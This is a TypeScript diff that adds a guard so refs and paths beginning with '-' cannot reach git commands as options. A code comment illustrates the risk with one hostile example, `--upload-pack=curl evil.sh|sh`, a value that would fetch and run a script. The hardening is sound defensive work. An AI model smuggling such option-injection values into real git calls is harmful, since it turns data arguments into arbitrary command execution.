@@ -383,12 +383,12 @@ async function seedWorkspace(
   const baselineSha = await gitOutput(repoRoot, [
     'rev-parse',
     '--verify',
-    `${task.baselineRef}^{commit}`,
+    `${assertGitDataArgument(task.baselineRef, 'baselineRef')}^{commit}`,
   ]);
   await git(workspacePath, [
     'fetch',
     '--no-tags',
-    repoRoot,
+    assertGitDataArgument(repoRoot, 'repoRoot'),
     '+refs/heads/*:refs/dogfood/heads/*',
     '+refs/remotes/*:refs/dogfood/remotes/*',
     '+refs/tags/*:refs/dogfood/tags/*',
@@ -603,6 +603,18 @@ function errorMessage(error: unknown): string {
   return error instanceof Error && error.message ? error.message : String(error);
 }
 
+// git reads any argument starting with `-` as an option wherever it appears, so
+// a path or ref that begins with one (`--upload-pack=curl evil.sh|sh`) turns a
+// data argument into command execution. Every caller here passes repo-local
+// paths and refs resolved from task files, never argv or network input; this
+// keeps that an invariant instead of an assumption.
+export function assertGitDataArgument(value: string, label: string): string {
+  if (value.startsWith('-')) {
+    throw new Error(`Dogfood ${label} cannot start with "-": ${value}`);
+  }
+  return value;
+}
+
 async function git(cwd: string, args: string[]): Promise<void> {
   await gitOutput(cwd, args);
 }
@@ -626,7 +638,8 @@ function commandFailure(
 }
 
 async function gitShow(repoRoot: string, ref: string, path: string): Promise<string | null> {
-  const result = await execa('git', ['show', `${ref}:${path}`], {
+  const spec = `${assertGitDataArgument(ref, 'ref')}:${assertGitDataArgument(path, 'path')}`;
+  const result = await execa('git', ['show', spec], {
     cwd: repoRoot,
     reject: false,
     stripFinalNewline: false,
